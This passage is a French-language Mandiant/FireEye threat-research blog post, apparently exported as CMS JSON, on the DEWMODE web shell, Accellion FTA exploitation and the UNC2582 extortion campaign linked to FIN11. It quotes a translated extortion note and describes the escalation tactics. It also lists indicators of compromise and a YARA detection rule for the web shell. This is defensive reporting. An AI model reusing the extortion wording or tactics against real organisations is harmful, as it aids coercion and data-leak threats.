avertissement.\u003C\/p\u003E\n\u003Cp\u003ESi vous ne nous contactez pas aujourd\u0027hui, nous cr\u00e9erons d\u00e8s demain une page contenant des copies d\u0027\u00e9cran de vos fichiers (similaire aux autres pages de notre site)\u0026nbsp; et enverrons des messages \u00e0 toutes les adresses e-mail trouv\u00e9es dans vos fichiers. \u00c9tant donn\u00e9 que des journalistes et des hackers consultent notre site, vous ne tarderez pas \u00e0 recevoir des appels et des questions. Les sites d\u0027infos commenceront \u00e0 publier des informations sur cette fuite et vous demanderont de r\u00e9agir.\u003C\/p\u003E\n\u003Cp\u003EPour \u00e9chapper \u00e0 ce genre de publicit\u00e9, contactez-nous par chat ou par e-mail pour discuter de votre situation.\u003C\/p\u003E\n\u003Cp\u003ECHAT\u00a0:\u0026nbsp; \u0026lt;victim-specific negotiation URL\u0026gt;\u003C\/p\u003E\n\u003Cp\u003EE-MAIL\u00a0: unlock@support-box.com\u003C\/p\u003E\n\u003Cp\u003EUTILISEZ LE NAVIGATEUR TOR\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure\u00a09\u00a0: Exemple n\u00b0\u00a02 de message d\u0027extorsion (traduction)\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003ED\u0027apr\u00e8s nos observations au cours de plusieurs interventions, UNC2582 semble suivre une proc\u00e9dure d\u0027escalade bien particuli\u00e8re pour faire pression sur les victimes jusqu\u0027\u00e0 ce qu\u0027elles acc\u00e8dent \u00e0 sa demande. Les premiers e-mails sont envoy\u00e9s \u00e0 partir d\u0027un compte de messagerie gratuit, probablement un par victime, \u00e0 une liste apparemment restreinte d\u0027adresses associ\u00e9es \u00e0 l\u0027entreprise cibl\u00e9e. Si la victime ne r\u00e9pond pas rapidement, d\u0027autres e-mails sont envoy\u00e9s \u00e0 un nombre bien plus grand de destinataires, \u00e0 partir de centaines voire de milliers de comptes de messagerie diff\u00e9rents et d\u0027une grande vari\u00e9t\u00e9 de serveurs SMTP. Dans au moins un cas, UNC2582 a \u00e9galement envoy\u00e9 des e-mails\u0026nbsp; \u00e0 des partenaires de sa victime. Ces messages contenaient des liens vers les donn\u00e9es vol\u00e9es et un chat pour la n\u00e9gociation. En surveillant le site de shaming CL0P^_- LEAKS, nous avons pu constater que les attaquants UNC2582 mettaient volontiers leurs menaces \u00e0 ex\u00e9cution. Ces derni\u00e8res semaines, les donn\u00e9es vol\u00e9es de plusieurs victimes ont \u00e9t\u00e9 publi\u00e9es, y compris celles d\u0027au moins une entreprise qui a confirm\u00e9 publiquement la compromission r\u00e9cente de son instance d\u0027Accellion FTA.\u003C\/p\u003E\n\u003Ch4\u003EPrincipaux points communs avec FIN11\u003C\/h4\u003E\n\u003Cp\u003E\u003Ci\u003ESimilitudes entre UNC2582 (extorsion) et FIN11\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EMandiant a trouv\u00e9 des points communs entre les activit\u00e9s de vol de donn\u00e9es et d\u0027extorsion d\u0027UNC2582 et d\u0027anciennes op\u00e9rations de \u003Ca href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research\/2020\/10\/fin11-email-campaigns-precursor-for-ransomware-data-theft.html\u0022\u003EFIN11\u003C\/a\u003E, notamment des adresses e-mail d\u0027exp\u00e9diteur et l\u0027utilisation du site de shaming CLOP^_- LEAKS. Bien que le groupe d\u0027attaque FIN11 soit connu pour ses d\u00e9ploiements du ransomware CLOP, nous avons d\u00e9j\u00e0 constat\u00e9 qu\u0027il proc\u00e9dait parfois \u00e0 des vols de donn\u00e9es et \u00e0 des tentatives d\u0027extorsion sans ransomware \u2013 comme UNC2582.\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003ECertains e-mails de chantage d\u0027UNC2582 datant de janvier\u00a02021 ont \u00e9t\u00e9 envoy\u00e9s \u00e0 partir d\u0027adresses IP et\/ou de comptes de messagerie utilis\u00e9s par FIN11 au cours de multiples campagnes de phishing entre ao\u00fbt et d\u00e9cembre\u00a02020, notamment certaines des derni\u00e8res op\u00e9rations clairement attribuables au groupe.\u003C\/li\u003E\n\u003Cli\u003ENous n\u0027avons encore d\u00e9tect\u00e9 aucune activit\u00e9 de phishing de FIN11 en 2021. Le groupe fait g\u00e9n\u00e9ralement une pause pendant les f\u00eates de fin d\u0027ann\u00e9e et a d\u00e9j\u00e0 lev\u00e9 le pied \u00e0 plusieurs reprises par le pass\u00e9. Toutefois, ce dernier hiatus co\u00efncide \u00e9galement avec une p\u00e9riode d\u0027activit\u00e9 d\u0027UNC2582 pour le vol de donn\u00e9es et le chantage.\u003C\/li\u003E\n\u003Cli\u003ELes e-mails d\u0027extorsion d\u0027UNC2582 contenaient un lien vers le site CL0P^_- LEAKS et\/ou vers une page de n\u00e9gociation propre \u00e0 chaque victime. Les sites web vers lesquels renvoyaient les liens \u00e9taient les m\u00eames que ceux utilis\u00e9s lors d\u0027anciennes op\u00e9rations de CLOP, une s\u00e9rie de campagnes de ransomware, de vol de donn\u00e9es et d\u0027extorsion attribuables uniquement \u00e0 FIN11 selon nous.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Ci\u003ESimilitudes entre UNC2546 (exploitation de FTA et DEWMODE) et FIN11\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003ENous avons \u00e9galement identifi\u00e9 un petit nombre de points communs entre FIN11 et UNC2546.\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EDe nombreuses entreprises compromises par UNC2546 ont d\u00e9j\u00e0 \u00e9t\u00e9 cibl\u00e9es par FIN11.\u003C\/li\u003E\n\u003Cli\u003EUne adresse IP qui communiquait avec un web shell DEWMODE faisait partie du bloc de r\u00e9seau \u0026quot;Fortunix Networks L.P.\u0026quot;, un r\u00e9seau fr\u00e9quemment utilis\u00e9 par FIN11 pour h\u00e9berger des domaines de t\u00e9l\u00e9chargement et des serveurs de commande et contr\u00f4le (CnC) FRIENDSPEAK.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch4\u003ER\u00e9percussions\u003C\/h4\u003E\n\u003Cp\u003ELes points communs entre FIN11, UNC2546 et UNC2582 sont \u00e9vidents. Toutefois, nous continuons d\u0027observer ces clusters s\u00e9par\u00e9ment pendant que nous tentons d\u0027\u00e9lucider la nature exacte de leur relation. La difficult\u00e9 tient notamment dans le fait que ces similitudes avec FIN11 concernent uniquement les stades avanc\u00e9s du cycle d\u0027attaque. En effet, UNC2546 utilise un vecteur d\u0027attaque et une m\u00e9thode d\u0027implantation diff\u00e9rente. Contrairement \u00e0 FIN11, le groupe ne s\u0027est apparemment pas non plus propag\u00e9 au reste des r\u00e9seaux infect\u00e9s. Par cons\u00e9quent, nous manquons encore de preuves pour attribuer formellement l\u0027exploitation de FTA, DEWMODE et les activit\u00e9s de vol de donn\u00e9es et d\u0027extorsion qui s\u0027ensuivent \u00e0 FIN11. L\u0027utilisation d\u0027injections SQL pour le d\u00e9ploiement de DEWMODE ou l\u0027acc\u00e8s \u00e0 un shell DEWMODE d\u0027un autre groupe d\u0027attaque repr\u00e9senterait une refonte compl\u00e8te du mode op\u00e9ratoire de FIN11. Par le pass\u00e9, le groupe a en effet mis\u00e9 sur les campagnes de phishing comme vecteur d\u0027attaque initial. Nous ne l\u0027avons pas encore vu exploiter des vuln\u00e9rabilit\u00e9s zero-day. \u0026nbsp;\u003C\/p\u003E\n\u003Ch4\u003ERemerciements\u003C\/h4\u003E\n\u003Cp\u003EDavid Wong, Brandon Walters, Stephen Eckels et Jon Erickson\u003C\/p\u003E\n\u003Ch4\u003EIndicateurs de compromission (IOC)\u003C\/h4\u003E\n\u003Cp\u003E\u003Ci\u003EWeb shells DEWMODE\u003C\/i\u003E\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022236\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EMD5\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022388\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003ESHA256\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022236\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2798c0e836b907e8224520e7e6e4bb42\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022388\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E5fa2b9546770241da7305356d6427847598288290866837626f621d794692c1b\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022236\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ebdfd11b1b092b7c61ce5f02ffc5ad55a\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022388\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E2e0df09fa37eabcae645302d9865913b818ee0993199a6d904728f3093ff48c7\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Ci style=\u0022font-size: 12px;\u0022\u003EAdresses IP source pour UNC2546\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003ELes adresses IP source suivantes ont \u00e9t\u00e9 identifi\u00e9es lors de multiples intrusions attribu\u00e9es \u00e0 UNC2546\u00a0:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E45.135.229.179\u003C\/li\u003E\n\u003Cli\u003E79.141.162.82\u003C\/li\u003E\n\u003Cli\u003E155.94.160.40\u003C\/li\u003E\n\u003Cli\u003E192.154.253.120\u003C\/li\u003E\n\u003Cli\u003E192.52.167.101\u003C\/li\u003E\n\u003Cli\u003E194.88.104.24\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch4\u003ED\u00e9tections\u003C\/h4\u003E\n\u003Cp\u003E\u003Ci\u003ED\u00e9tections FireEye\u003C\/i\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EFE_Webshell_PHP_DEWMODE_1\u003C\/li\u003E\n\u003Cli\u003EFEC_Webshell_PHP_DEWMODE_1\u003C\/li\u003E\n\u003Cli\u003EWebshell.PHP.DEWMODE\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Ci\u003EMandiant Security Validation\u003C\/i\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EA101-515 Transferts de fichiers malveillants - web shell DEWMODE, upload, variante n\u00b0\u00a01\u003C\/li\u003E\n\u003Cli\u003EA101-516 Transferts de fichiers malveillants - web shell DEWMODE, upload, variante n\u00b0\u00a02\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Ci\u003ER\u00e8gle YARA pour DEWMODE\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003ELa r\u00e8gle YARA ci-dessous n\u2019a pas vocation \u00e0 \u00eatre utilis\u00e9e sur des syst\u00e8mes en production, ni \u00e0 sous-tendre des r\u00e8gles de blocage sans avoir \u00e9t\u00e9 d\u2019abord valid\u00e9e lors de tests internes visant \u00e0 garantir ses bonnes performances et \u00e0 limiter le risque de faux positifs. Cette r\u00e8gle peut servir de point de d\u00e9part \u00e0 vos activit\u00e9s de traque des payloads DEWMODE. Toutefois, vous devrez peut-\u00eatre l\u0027adapter au fil du temps, si la famille de malware \u00e9volue.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cspan class=\u0022code\u0022\u003Erule DEWMODE_PHP_Webshell\u003Cbr\u003E\n {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; strings:\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s1 = \/if \\(isset\\(\\$_REQUEST\\[[\\x22\\x27]dwn[\\x22\\x27]]\\)[\\x09\\x20]{0,32}\u0026amp;\u0026amp;[\\x09\\x20]{0,32}isset\\(\\$_REQUEST\\[[\\x22\\x27]fn[\\x22\\x27]\\]\\)\\)\\s{0,256}\\{\/\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s2 = \u0026quot;\u0026lt;th\u0026gt;file_id\u0026lt;\/th\u0026gt;\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s3 = \u0026quot;\u0026lt;th\u0026gt;path\u0026lt;\/th\u0026gt;\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s4 = \u0026quot;\u0026lt;th\u0026gt;file_name\u0026lt;\/th\u0026gt;\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s5 = \u0026quot;\u0026lt;th\u0026gt;uploaded_by\u0026lt;\/th\u0026gt;\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s6 = \u0026quot;target=\\\\\\\u0026quot;_blank\\\\\\\u0026quot;\u0026gt;Download\u0026lt;\/a\u0026gt;\u0026lt;\/td\u0026gt;\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s7 = \u0026quot;Content-Type: application\/octet-stream\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $s8 = \u0026quot;Content-disposition: attachment; filename=\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; condition:\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; all of them\u003Cbr\u003E\n }\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n",
        "jcr:lastModified": "Mon Feb 22 2021 16:10:37 GMT+0000",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "lynda.hall@fireeye.com",
      "jcr:lastModified": "Mon Feb 22 2021 19:54:03 GMT+0000",
      "imageRotate": "0"
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003ELe groupe d\u0027attaque que nous avons nomm\u00e9 UNC2546 a exploit\u00e9 plusieurs vuln\u00e9rabilit\u00e9s zero-day d\u0027une ancienne version de l\u0027application de transfert de fichiers d\u0027Accellion afin d\u0027installer le web shell DEWMODE, inconnu jusqu\u0027alors.\u003C\/p\u003E\n",
      "jcr:lastModified": "Fri Feb 19 2021 03:05:43 GMT+0000",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    }
  }
}
